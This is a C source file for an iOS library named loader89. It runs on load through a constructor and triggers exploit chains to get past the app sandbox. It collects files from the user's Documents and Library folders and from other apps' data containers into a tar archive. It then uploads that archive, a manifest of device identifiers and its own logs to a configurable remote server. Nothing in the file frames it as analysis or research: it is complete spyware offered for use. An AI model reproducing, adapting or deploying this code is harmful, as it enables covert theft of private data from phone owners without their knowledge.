/* loader89.c - 89yl 双链路加载器 v4
 * exploit chain: AcqViewCntrlr_ RunServer + Sploit
 * MHA/MCM fallback chain: libuiopsersvc `_mcm_filza_run` -> virtual root
 * Both chains write a real tar archive and auto-upload it.
 */
typedef unsigned long u64;
typedef long long i64;

extern void *dlopen(const char *, int);
extern void *dlsym(void *, const char *);
extern void *malloc(unsigned long);
extern void free(void *);
extern void *memcpy(void *, const void *, unsigned long);
extern unsigned long strlen(const char *);
extern int snprintf(char *, unsigned long, const char *, ...);
extern int open(const char *, int, ...);
extern int close(int);
extern long write(int, const void *, unsigned long);
extern long read(int, void *, unsigned long);
extern unsigned int sleep(unsigned int);
extern long time(void *);
extern int pthread_create(void *, const void *, void *(*)(void *), void *);
extern int pthread_detach(void *);
extern int sysctlbyname(const char *, void *, unsigned long *, void *, unsigned long);
extern char *getenv(const char *);
extern int strcmp(const char *, const char *);
extern int dup2(int, int);
extern int fflush(void *);

#define RTLD_DEFAULT ((void *)-2)
#define O_RDONLY 0
#define O_WRONLY 1
#define O_CREAT 0x200
#define O_APPEND 8
#define O_TRUNC 0x400

#define LOADER89_DEFAULT_HOST "192.168.1.167"
#define LOADER89_DEFAULT_PORT 8080

#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>

static void *(*p_dlsym)(void *, const char *);
static void *(*p_msgSend)();
static void *(*p_getClass)(const char *);
static void *(*p_sel)(const char *);
static void *(*p_nslog)();
static void *(*p_retain)(void *);
static void *(*p_release)(void *);
static int g_logfd = -1;
static char g_logpath[512];
static char g_host[128];
static int g_port = LOADER89_DEFAULT_PORT;

static void raw_log(const char *s) {
    if (g_logfd >= 0) { write(g_logfd, s, strlen(s)); write(g_logfd, "\n", 1); }
    if (p_nslog && p_getClass && p_msgSend && p_sel) {
        void *nsstring = p_getClass("NSString");
        if (nsstring) {
            void *s2 = p_msgSend(nsstring, p_sel("stringWithUTF8String:"), (char *)s);
            if (s2) p_nslog(s2);
        }
    }
}

static void log_line(const char *level, const char *msg) {
    char ts[32], buf[1400];
    snprintf(ts, sizeof(ts), "%lld", (long long)time(0));
    snprintf(buf, sizeof(buf), "{\"ts\":%s,\"level\":\"%s\",\"msg\":\"%s\"}", ts, level, msg);
    raw_log(buf);
}

static void log_info(const char *msg) { log_line("info", msg); }
static void log_warn(const char *msg) { log_line("warn", msg); }
static void log_error(const char *msg) { log_line("error", msg); }

static void log_u64(const char *tag, u64 v) {
    char buf[180];
    snprintf(buf, sizeof(buf), "%s%llu", tag, (unsigned long long)v);
    log_info(buf);
}

static char *cat3(const char *a, const char *b, const char *c) {
    unsigned long n = strlen(a) + strlen(b) + strlen(c) + 1;
    char *p = (char *)malloc(n);
    unsigned long i = 0, j;
    for (j = 0; a[j]; j++) p[i++] = a[j];
    for (j = 0; b[j]; j++) p[i++] = b[j];
    for (j = 0; c[j]; j++) p[i++] = c[j];
    p[i] = 0;
    return p;
}

static void json_escape(char *dst, unsigned long dstn, const char *src) {
    unsigned long i = 0, o = 0;
    while (src[i] && o + 6 < dstn) {
        char c = src[i];
        if (c == '"' || c == '\\') { dst[o++] = '\\'; dst[o++] = c; }
        else if (c >= 0x20 && (unsigned char)c < 0x80) dst[o++] = c;
        else { dst[o++] = '?'; }
        i++;
    }
    dst[o] = 0;
}

static void sysctl_str(const char *name, char *out, unsigned long outn) {
    char buf[160];
    unsigned long n = sizeof(buf);
    if (sysctlbyname(name, buf, &n, 0, 0) == 0) {
        unsigned long i = 0;
        for (; i < outn - 1 && i < n && buf[i]; i++) out[i] = buf[i];
        out[i] = 0;
    } else out[0] = 0;
}

static char *objc_cstr(void *obj) {
    if (!obj) return 0;
    const char *s = (const char *)p_msgSend(obj, p_sel("UTF8String"));
    if (!s) return 0;
    unsigned long n = strlen(s);
    char *out = (char *)malloc(n + 1);
    unsigned long i;
    for (i = 0; i <= n; i++) out[i] = s[i];
    return out;
}

static char *info_string(const char *key) {
    void *bundle = p_msgSend(p_getClass("NSBundle"), p_sel("mainBundle"));
    if (!bundle) return 0;
    void *nsstring = p_getClass("NSString");
    void *k = p_msgSend(nsstring, p_sel("stringWithUTF8String:"), (char *)key);
    void *obj = p_msgSend(bundle, p_sel("objectForInfoDictionaryKey:"), k);
    return objc_cstr(obj);
}

static long info_int(const char *key, long fallback) {
    void *bundle = p_msgSend(p_getClass("NSBundle"), p_sel("mainBundle"));
    if (!bundle) return fallback;
    void *nsstring = p_getClass("NSString");
    void *k = p_msgSend(nsstring, p_sel("stringWithUTF8String:"), (char *)key);
    void *obj = p_msgSend(bundle, p_sel("objectForInfoDictionaryKey:"), k);
    if (!obj) return fallback;
    long v = (long)p_msgSend(obj, p_sel("intValue"));
    return v ? v : fallback;
}

static int path_exists(const char *path) {
    struct stat st;
    return path && path[0] && stat(path, &st) == 0;
}

static long dir_file_count(const char *path, int depth) {
    if (!path || !path[0]) return -1;
    DIR *dir = opendir(path);
    if (!dir) return -1;
    long n = 0;
    struct dirent *e;
    while ((e = (struct dirent *)readdir(dir))) {
        const char *nm = e->d_name;
        if (nm[0] == '.' && (nm[1] == 0 || (nm[1] == '.' && nm[2] == 0))) continue;
        char *full = cat3(path, "/", nm);
        struct stat st;
        if (lstat(full, &st) == 0) {
            if ((st.st_mode & 0xF000) == 0x4000) {
                if (depth > 0) n += dir_file_count(full, depth - 1);
            } else n++;
        }
        free(full);
    }
    closedir(dir);
    return n;
}

static char *objc_property_string(void *obj, const char *selname) {
    if (!obj) return 0;
    void *v = p_msgSend(obj, p_sel(selname));
    return objc_cstr(v);
}

static char *device_string(const char *selector) {
    void *dev = p_msgSend(p_getClass("UIDevice"), p_sel("currentDevice"));
    if (!dev) return 0;
    return objc_cstr(p_msgSend(dev, p_sel(selector)));
}

static void read_runtime_config(void) {
    char *h = info_string("Loader89Host");
    if (h && h[0]) {
        unsigned long i = 0;
        for (; i < sizeof(g_host) - 1 && h[i]; i++) g_host[i] = h[i];
        g_host[i] = 0;
    } else {
        unsigned long i = 0;
        for (; i < sizeof(g_host) - 1 && LOADER89_DEFAULT_HOST[i]; i++) g_host[i] = LOADER89_DEFAULT_HOST[i];
        g_host[i] = 0;
    }
    if (h) free(h);
    g_port = (int)info_int("Loader89Port", LOADER89_DEFAULT_PORT);
    if (g_port <= 0 || g_port > 65535) g_port = LOADER89_DEFAULT_PORT;
}

static void init_log(void) {
    char *home = getenv("HOME");
    char *p = cat3(home ? home : "/var/mobile", "/Documents/loader89.log", "");
    unsigned long i = 0;
    for (; i < sizeof(g_logpath) - 1 && p[i]; i++) g_logpath[i] = p[i];
    g_logpath[i] = 0;
    g_logfd = open(g_logpath, O_WRONLY | O_CREAT | O_APPEND, 0644);
    free(p);
}

static void post_log_now(void) {
    if (!g_host[0] || g_logfd < 0) return;
    void *nsstring = p_getClass("NSString");
    char url[256];
    snprintf(url, sizeof(url), "http://%s:%d/log", g_host, g_port);
    void *urlStr = p_msgSend(nsstring, p_sel("stringWithUTF8String:"), url);
    void *nsurl = p_msgSend(p_getClass("NSURL"), p_sel("URLWithString:"), urlStr);
    if (!nsurl) return;
    void *req = p_msgSend(p_getClass("NSMutableURLRequest"), p_sel("requestWithURL:"), nsurl);
    if (!req) return;
    p_msgSend(req, p_sel("setHTTPMethod:"), p_msgSend(nsstring, p_sel("stringWithUTF8String:"), "POST"));
    void *data = p_msgSend(p_getClass("NSData"), p_sel("dataWithContentsOfFile:"), p_msgSend(nsstring, p_sel("stringWithUTF8String:"), g_logpath));
    if (!data) return;
    p_msgSend(req, p_sel("setHTTPBody:"), data);
    void *resp = 0, *err = 0;
    void *ret = p_msgSend(p_getClass("NSURLConnection"), p_sel("sendSynchronousRequest:returningResponse:error:"), req, &resp, &err);
    log_info(ret ? "log upload OK" : "log upload FAIL");
}

/* ---------- tar writing ---------- */
static int write_all(int fd, const void *buf, unsigned long n) {
    const unsigned char *p = (const unsigned char *)buf;
    while (n) {
        long r = write(fd, p, n);
        if (r <= 0) return -1;
        p += r; n -= (unsigned long)r;
    }
    return 0;
}

static void put_octal(char *dst, int n, unsigned long v) {
    int i = n - 1;
    dst[i--] = 0;
    while (i >= 0) { dst[i--] = (char)('0' + (v % 8)); v /= 8; }
}

static int tar_header(int fd, const char *name, unsigned long size, char type, long mtime) {
    unsigned char h[512];
    int i;
    for (i = 0; i < 512; i++) h[i] = 0;
    for (i = 0; name[i] && i < 100; i++) h[i] = (unsigned char)name[i];
    put_octal((char *)h + 100, 8, 0644);
    put_octal((char *)h + 108, 8, 0);
    put_octal((char *)h + 116, 8, 0);
    put_octal((char *)h + 124, 12, size);
    put_octal((char *)h + 136, 12, (unsigned long)mtime);
    for (i = 148; i < 156; i++) h[i] = ' ';
    h[156] = (unsigned char)type;
    h[257] = 'u'; h[258] = 's'; h[259] = 't'; h[260] = 'a'; h[261] = 'r';
    h[262] = 0; h[263] = '0'; h[264] = '0';
    unsigned long sum = 0;
    for (i = 0; i < 512; i++) sum += h[i];
    put_octal((char *)h + 148, 8, sum);
    h[155] = ' ';
    return write_all(fd, h, 512);
}

static int tar_long_name(int fd, const char *name) {
    unsigned long n = strlen(name) + 1;
    if (tar_header(fd, "././@LongLink", n, 'L', (long)time(0)) < 0) return -1;
    if (write_all(fd, name, n) < 0) return -1;
    unsigned long pad = (512 - (n % 512)) % 512;
    char zero[512] = {0};
    if (pad && write_all(fd, zero, pad) < 0) return -1;
    return 0;
}

static int tar_copy_file(int fd, const char *path, const char *name, long size) {
    int in = open(path, O_RDONLY);
    if (in < 0) return -1;
    if (name[0] && strlen(name) > 99) {
        if (tar_long_name(fd, name) < 0) { close(in); return -1; }
    }
    if (tar_header(fd, name, (unsigned long)size, '0', (long)time(0)) < 0) { close(in); return -1; }
    char buf[8192];
    long left = size;
    while (left > 0) {
        long r = read(in, buf, left < (long)sizeof(buf) ? (unsigned long)left : sizeof(buf));
        if (r <= 0) break;
        if (write_all(fd, buf, (unsigned long)r) < 0) { close(in); return -1; }
        left -= r;
    }
    close(in);
    if (left > 0) size -= left;
    unsigned long written = (unsigned long)size;
    unsigned long pad = (512 - (written % 512)) % 512;
    char zero[512] = {0};
    if (pad && write_all(fd, zero, pad) < 0) return -1;
    return 0;
}

static int is_dirlike(const char *path, struct stat *st) {
    if (lstat(path, st) != 0) return 0;
    if ((st->st_mode & 0xF000) == 0x4000) return 1;
    if ((st->st_mode & 0xF000) == 0xA000) {
        struct stat ts;
        if (stat(path, &ts) == 0 && (ts.st_mode & 0xF000) == 0x4000) { *st = ts; return 1; }
    }
    return 0;
}

static int tar_add_tree(const char *base, const char *rel, int tarfd, char *out, unsigned long *used,
                        unsigned long outn, int max_files, int depth, unsigned long *budget) {
    if (depth > 5 || max_files <= 0 || *used + 1 >= outn || *budget < 1024) return 0;
    char *full = rel[0] ? cat3(base, "/", rel) : cat3(base, "", "");
    DIR *dir = opendir(full);
    free(full);
    if (!dir) return 0;
    int count = 0;
    struct dirent *e;
    while ((e = (struct dirent *)readdir(dir)) && count < max_files) {
        const char *nm = e->d_name;
        if (nm[0] == '.' && (nm[1] == 0 || (nm[1] == '.' && nm[2] == 0))) continue;
        char *r2 = rel[0] ? cat3(rel, "/", nm) : (char *)nm;
        char *path = cat3(base, "/", r2);
        struct stat st;
        if (is_dirlike(path, &st)) {
            count += tar_add_tree(base, r2, tarfd, out, used, outn, max_files - count, depth + 1, budget);
        } else {
            struct stat fs;
            if (lstat(path, &fs) == 0 && (fs.st_mode & 0xF000) != 0x4000 && fs.st_size > 0 && fs.st_size <= 8 * 1024 * 1024) {
                if ((unsigned long)fs.st_size + 1024 <= *budget && tar_copy_file(tarfd, path, r2, (long)fs.st_size) == 0) {
                    char jp[620], esc[400];
                    json_escape(esc, sizeof(esc), r2);
                    int n = snprintf(jp, sizeof(jp), "{\"path\":\"%s\",\"size\":%lld}", esc, (long long)fs.st_size);
                    if (n > 0 && *used + (unsigned long)n + 2 < outn) {
                        if (*used > 0) out[(*used)++] = ',';
                        for (int k = 0; k < n; k++) out[(*used)++] = jp[k];
                    }
                    *budget -= (unsigned long)fs.st_size + 1024;
                    count++;
                }
            }
        }
        if (r2 != (char *)nm) free(r2);
        free(path);
    }
    closedir(dir);
    if (*used < outn) out[*used] = 0;
    return count;
}

static void finish_tar(int fd) {
    char zero[1024] = {0};
    write_all(fd, zero, 1024);
    close(fd);
}

static void repair_core_log_sink(void *core) {
    if (!core) return;
    unsigned char *base = (unsigned char *)core;
    void **sink = (void **)(base + 0x6ca1b8);
    void **slot = (void **)(base + 0x6b98c0);
    char msg[220];
    snprintf(msg, sizeof(msg), "core sink before vtable=%p slot=%p", *sink, (void *)*slot);
    log_info(msg);
    if (*sink) {
        log_info("core sink vtable OK");
        return;
    }
    void (*init_sink)(void) = (void (*)(void))(base + 0x59fa28);
    log_info("core sink vtable ZERO; running init 0x59fa28");
    init_sink();
    snprintf(msg, sizeof(msg), "core sink after vtable=%p slot=%p", *sink, (void *)*slot);
    log_info(msg);
}

static void *run_server_worker(void *arg) {
    void *inst = arg;
    if (inst) {
        log_info("RunServer start");
        p_msgSend(inst, p_sel("RunServer"));
        log_info("RunServer returned");
    }
    return 0;
}

static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, const char *mcm_root) {
    void *cls = p_getClass("_CSDataExchange");
    if (!cls) { log_error("CSDataExchange missing"); return 0; }
    void *nsstring = p_getClass("NSString");
    void *sel_str_u8 = p_sel("stringWithUTF8String:");
    void *inst = p_msgSend(p_msgSend(cls, p_sel("alloc")), p_sel("initWithHost:port:"),
                           p_msgSend(nsstring, sel_str_u8, g_host), (void *)(long)g_port);
    if (!inst) { log_error("CSDataExchange init FAIL"); return 0; }

    void *err = 0;
    long ok = (long)p_msgSend(inst, p_sel("handshakeWithError:"), &err);
    log_info(ok ? "handshake OK" : "handshake FAIL");
    if (!ok) { p_release(inst); return 0; }

    err = 0;
    long ok2 = (long)p_msgSend(inst, p_sel("startAcquisition:error:"), p_msgSend(nsstring, sel_str_u8, "filesystem"), &err);
    log_info(ok2 ? "startAcquisition OK" : "startAcquisition FAIL");
    if (!ok2) { p_release(inst); return 0; }

    char files[20000];
    files[0] = 0;
    unsigned long used = 0;
    int nfiles = 0;
    unsigned long budget = 48 * 1024 * 1024;
    char *home = getenv("HOME");
    char tarpath[600];
    tarpath[0] = 0;
    if (home) {
        char *tmp = cat3(home, "/Documents/loader89_bundle.tar", "");
        unsigned long i = 0;
        for (; i < sizeof(tarpath) - 1 && tmp[i]; i++) tarpath[i] = tmp[i];
        tarpath[i] = 0;
        free(tmp);
    }
    if (!tarpath[0]) snprintf(tarpath, sizeof(tarpath), "/tmp/loader89_bundle.tar");
    int tarfd = open(tarpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    log_info(tarfd >= 0 ? "tar open OK" : "tar open FAIL");
    if (tarfd >= 0) {
        if (home) {
            char *docs = cat3(home, "/Documents", "");
            nfiles += tar_add_tree(docs, "", tarfd, files, &used, sizeof(files), 120, 0, &budget);
            free(docs);
            char *lib = cat3(home, "/Library", "");
            nfiles += tar_add_tree(lib, "Library", tarfd, files, &used, sizeof(files), 120, 0, &budget);
            free(lib);
        }
        if (mha_ok && mcm_root && mcm_root[0]) {
            nfiles += tar_add_tree(mcm_root, "MCMRoot", tarfd, files, &used, sizeof(files), 650, 0, &budget);
        }
        if (exploit_ok) {
            nfiles += tar_add_tree("/var/mobile/Containers/Data/Application", "Containers/Data/Application", tarfd,
                                   files, &used, sizeof(files), 120, 0, &budget);
            nfiles += tar_add_tree("/var/mobile/Containers/Shared/AppGroup", "Containers/Shared/AppGroup", tarfd,
                                   files, &used, sizeof(files), 80, 0, &budget);
        }
        finish_tar(tarfd);
    }
    log_u64("tar files=", (u64)nfiles);

    char model[80], sysver[80], deviceName[160], idfv[120], bundleId[160], appVersion[80];
    sysctl_str("hw.machine", model, sizeof(model));
    char *sv = device_string("systemVersion");
    if (sv) { unsigned long i = 0; for (; i < sizeof(sysver) - 1 && sv[i]; i++) sysver[i] = sv[i]; sysver[i] = 0; free(sv); }
    else sysctl_str("kern.osrelease", sysver, sizeof(sysver));
    char *dn = device_string("name");
    if (dn) { unsigned long i = 0; for (; i < sizeof(deviceName) - 1 && dn[i]; i++) deviceName[i] = dn[i]; deviceName[i] = 0; free(dn); }
    else deviceName[0] = 0;
    char *iv = device_string("identifierForVendor");
    if (iv) { unsigned long i = 0; for (; i < sizeof(idfv) - 1 && iv[i]; i++) idfv[i] = iv[i]; idfv[i] = 0; free(iv); }
    else idfv[0] = 0;
    char *bid = info_string("CFBundleIdentifier");
    if (bid) { unsigned long i = 0; for (; i < sizeof(bundleId) - 1 && bid[i]; i++) bundleId[i] = bid[i]; bundleId[i] = 0; free(bid); }
    else bundleId[0] = 0;
    char *av = info_string("CFBundleShortVersionString");
    if (av) { unsigned long i = 0; for (; i < sizeof(appVersion) - 1 && av[i]; i++) appVersion[i] = av[i]; appVersion[i] = 0; free(av); }
    else appVersion[0] = 0;

    char msg[900];
    char eName[64], eSource[64], eRoot[512];
    json_escape(eName, sizeof(eName), model);
    json_escape(eSource, sizeof(eSource), source);
    json_escape(eRoot, sizeof(eRoot), mcm_root ? mcm_root : "");
    char ts[32];
    snprintf(ts, sizeof(ts), "%lld", (long long)time(0));
    char *body = (char *)malloc(20480);
    unsigned long bo = 0;
    int n = snprintf(body + bo, 20480 - bo,
        "{\"deviceName\":\"%s\",\"model\":\"%s\",\"systemName\":\"iOS\",\"systemVersion\":\"%s\","
        "\"identifierForVendor\":\"%s\",\"appBundle\":\"%s\",\"appVersion\":\"%s\","
        "\"collectedAt\":%s,\"exploit\":%s,\"mha\":%s,\"source\":\"%s\",\"mcmRoot\":\"%s\",\"sandboxFiles\":[",
        deviceName, eName, sysver, idfv, bundleId, appVersion, ts,
        exploit_ok ? "true" : "false", mha_ok ? "true" : "false", eSource, eRoot);
    bo += n;
    for (unsigned long k = 0; k < used && bo < 19700; k++) body[bo++] = files[k];
    n = snprintf(body + bo, 20480 - bo, "]}");
    bo += n;
    log_u64("manifest bytes=", (u64)bo);

    void *nsdata = p_getClass("NSData");
    void *data = p_msgSend(nsdata, p_sel("dataWithBytes:length:"), body, (unsigned long)bo);
    free(body);
    if (!data) { log_error("NSData FAIL"); p_release(inst); return 0; }

    err = 0;
    long ok3 = (long)p_msgSend(inst, p_sel("uploadChunk:acquisitionType:fileName:error:"), data,
                               p_msgSend(nsstring, sel_str_u8, "filesystem"),
                               p_msgSend(nsstring, sel_str_u8, "loader89_manifest.json"), &err);
    log_info(ok3 ? "manifest uploadChunk OK" : "manifest uploadChunk FAIL");

    long ok4 = 0;
    if (tarfd >= 0 && tarpath[0]) {
        struct stat ts;
        long tsize = stat(tarpath, &ts) == 0 ? (long)ts.st_size : -1;
        void *pathStr = p_msgSend(nsstring, sel_str_u8, tarpath);
        void *typeStr = p_msgSend(nsstring, sel_str_u8, "filesystem");
        ok4 = (long)p_msgSend(inst, p_sel("uploadFileSync:acquisitionType:"), pathStr, typeStr);
        snprintf(msg, sizeof(msg), "tar uploadFileSync ret=%ld size=%ld path=%s", ok4, tsize, tarpath);
        log_info(msg);
    }

    err = 0;
    p_msgSend(inst, p_sel("endAcquisition:error:"), p_msgSend(nsstring, sel_str_u8, "filesystem"), &err);
    err = 0;
    p_msgSend(inst, p_sel("endSessionWithError:"), &err);
    p_release(inst);
    return (void *)(long)(ok && ok2 && ok3 && ok4);
}

static void *worker(void *arg) {
    (void)arg;
    sleep(2);
    init_log();
    p_dlsym = (void *(*)(void *, const char *))dlsym(RTLD_DEFAULT, "dlsym");
    p_msgSend = (void *(*)())dlsym(RTLD_DEFAULT, "objc_msgSend");
    p_getClass = (void *(*)(const char *))dlsym(RTLD_DEFAULT, "objc_getClass");
    p_sel = (void *(*)(const char *))dlsym(RTLD_DEFAULT, "sel_registerName");
    p_nslog = (void *(*)())dlsym(RTLD_DEFAULT, "NSLog");
    p_retain = (void *(*)(void *))dlsym(RTLD_DEFAULT, "objc_retain");
    p_release = (void *(*)(void *))dlsym(RTLD_DEFAULT, "objc_release");
    if (!p_msgSend || !p_getClass || !p_sel || !p_release) { log_error("objc runtime missing"); return 0; }

    if (g_logfd >= 0) {
        int o = dup2(g_logfd, 1);
        int e = dup2(g_logfd, 2);
        fflush(0);
        char dm[128];
        snprintf(dm, sizeof(dm), "stdout/stderr redirect out=%d err=%d", o, e);
        log_info(dm);
    }

    log_info("=== loader89 v4.2 dual-chain start ===");
    read_runtime_config();
    char msg[600], bid[200];
    snprintf(msg, sizeof(msg), "runtime host=%s port=%d log=%s", g_host, g_port, g_logpath);
    log_info(msg);
    char *b0 = info_string("CFBundleIdentifier");
    if (b0) { unsigned long i = 0; for (; i < sizeof(bid) - 1 && b0[i]; i++) bid[i] = b0[i]; bid[i] = 0; free(b0); }
    else snprintf(bid, sizeof(bid), "-");
    snprintf(msg, sizeof(msg), "bundleId=%s required=%s", bid, strcmp(bid, "com.apple.mobile.MobileHouseArrest") == 0 ? "OK" : "MISMATCH");
    log_info(msg);

    void *xpf = dlopen("@executable_path/Frameworks/libxpf.dylib", 0xA);
    void *grab = dlopen("@executable_path/Frameworks/libgrabkernel2.dylib", 0xA);
    void *mcm = dlopen("@executable_path/Frameworks/libuiopsersvc.framework/libuiopsersvc", 0xA);
    void *core = dlopen("@executable_path/Frameworks/libwebuiopsercore.framework/libwebuiopsercore", 0xA);
    void *sd = dlopen("@executable_path/Frameworks/SDWebuiopser.framework/SDWebuiopser", 0xA);
    log_info(xpf ? "dlopen libxpf OK" : "dlopen libxpf FAIL");
    log_info(grab ? "dlopen libgrabkernel2 OK" : "dlopen libgrabkernel2 FAIL");
    log_info(mcm ? "dlopen libuiopsersvc OK" : "dlopen libuiopsersvc FAIL");
    log_info(core ? "dlopen core OK" : "dlopen core FAIL");
    log_info(sd ? "dlopen SD OK" : "dlopen SD FAIL");
    repair_core_log_sink(core);
    post_log_now();

    int exploit_ok = 0;
    void *acqCls = p_getClass("AcqViewCntrlr_");
    log_info(acqCls ? "AcqViewCntrlr_ class OK" : "AcqViewCntrlr_ class MISSING");
    if (acqCls) {
        void *acq = p_msgSend(p_msgSend(acqCls, p_sel("alloc")), p_sel("init"));
        log_info(acq ? "AcqViewCntrlr_ instance OK" : "AcqViewCntrlr_ instance FAIL");
        if (acq) {
            static void *serverThread;
            if (pthread_create(&serverThread, 0, run_server_worker, acq) == 0) pthread_detach(serverThread);
            sleep(1);
            p_msgSend(acq, p_sel("InitLogs"));
            log_info("InitLogs returned");
            char *st0 = objc_property_string(acq, "lblState");
            log_info(st0 ? st0 : "lblState=(null)");
            if (st0) free(st0);
            log_info("Sploit start");
            p_msgSend(acq, p_sel("Sploit"));
            log_info("Sploit returned");
            sleep(3);
            char *state = objc_property_string(acq, "lblState");
            log_info(state ? state : "lblState=(null)");
            if (state) free(state);
            if (core) {
                unsigned char *flag = (unsigned char *)core + 0x6b96d8;
                exploit_ok = (*flag == 0);
                snprintf(msg, sizeof(msg), "exploit raw=%d ok=%d flag_addr=%p", (int)*flag, exploit_ok, (void *)flag);
                log_info(msg);
            }
            p_release(acq);
        }
    }

    int mha_ok = 0;
    char mcm_root[512] = {0};
    if (mcm) {
        int (*bridge)(void) = (int (*)(void))dlsym(mcm, "_MCMBridgeAvailable");
        int (*run)(void) = (int (*)(void))dlsym(mcm, "_mcm_filza_run");
        int (*ready)(void) = (int (*)(void))dlsym(mcm, "_mcm_filza_is_ready");
        void *(*root)(void) = (void *(*)(void))dlsym(mcm, "_MCMFilzaVirtualRoot");
        log_info(bridge ? "MCMBridgeAvailable symbol OK" : "MCMBridgeAvailable symbol MISSING");
        log_info(run ? "mcm_filza_run symbol OK" : "mcm_filza_run symbol MISSING");
        log_info(ready ? "mcm_filza_is_ready symbol OK" : "mcm_filza_is_ready symbol MISSING");
        log_info(root ? "MCMFilzaVirtualRoot symbol OK" : "MCMFilzaVirtualRoot symbol MISSING");
        int bridge_ok = bridge ? bridge() : 0;
        snprintf(msg, sizeof(msg), "MCM bridge=%d", bridge_ok);
        log_info(msg);
        int run_ret = run ? run() : 0;
        snprintf(msg, sizeof(msg), "mcm_filza_run=%d", run_ret);
        log_info(msg);
        int ready_ok = 0;
        for (int i = 0; i < 20; i++) {
            ready_ok = ready ? ready() : 0;
            if (ready_ok) break;
            void *r = root ? root() : 0;
            if (r) {
                char *cs = objc_cstr(r);
                if (cs && cs[0]) {
                    unsigned long j = 0;
                    for (; j < sizeof(mcm_root) - 1 && cs[j]; j++) mcm_root[j] = cs[j];
                    mcm_root[j] = 0;
                    free(cs);
                }
            }
            if (r) p_release(r);
            if (mcm_root[0] && path_exists(mcm_root)) break;
            sleep(1);
        }
        ready_ok = ready ? ready() : 0;
        int root_exists = path_exists(mcm_root);
        long root_files = root_exists ? dir_file_count(mcm_root, 3) : -1;
        mha_ok = ready_ok || (root_exists && root_files > 0);
        snprintf(msg, sizeof(msg), "MHA/MCM ready=%d root=%s exists=%d files=%ld", ready_ok, mcm_root, root_exists, root_files);
        log_info(msg);
    }
    post_log_now();

    char source[80];
    snprintf(source, sizeof(source), "%s", exploit_ok ? "exploit+mha" : (mha_ok ? "mha" : "fallback"));
    void *up = upload_manifest(exploit_ok, mha_ok, source, mcm_root);
    log_info(up ? "dual-chain upload OK" : "dual-chain upload FAIL");
    post_log_now();
    log_info("=== loader89 done ===");
    if (g_logfd >= 0) { close(g_logfd); g_logfd = -1; }
    return 0;
}

static void *g_thread_start;

__attribute__((constructor))
static void loader89_init(void) {
    static void *th;
    void *(*fn)(void *) = worker;
    g_thread_start = (void *)fn;
    if (pthread_create(&th, 0, worker, 0) == 0) pthread_detach(th);
}

